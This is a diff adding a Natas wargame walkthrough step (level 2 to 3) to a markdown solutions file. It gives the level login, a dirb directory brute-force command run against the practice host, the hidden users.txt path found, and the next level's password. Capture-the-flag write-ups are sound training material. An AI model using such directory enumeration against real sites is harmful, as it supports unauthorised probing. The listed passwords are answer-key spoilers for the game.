@@ -293,3 +293,20 @@ http://natas2.natas.labs.overthewire.org/files/users.txt
 natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
 ```
 </details>
+<details>
+<summary><a href="https://overthewire.org/wargames/natas/natas3.html">Level 2 → Level 3</a></summary>
+
+```text
+Username: natas3
+Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+http://natas3.natas.labs.overthewire.org
+```
+```text
+Solution:
+brew install sidaf/pentest/dirb
+https://gist.github.com/gmolveau/c6c1398b3351a99509c75d2d7bcaacc7
+dirb http://natas3.natas.labs.overthewire.org/ -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+```
+</details>
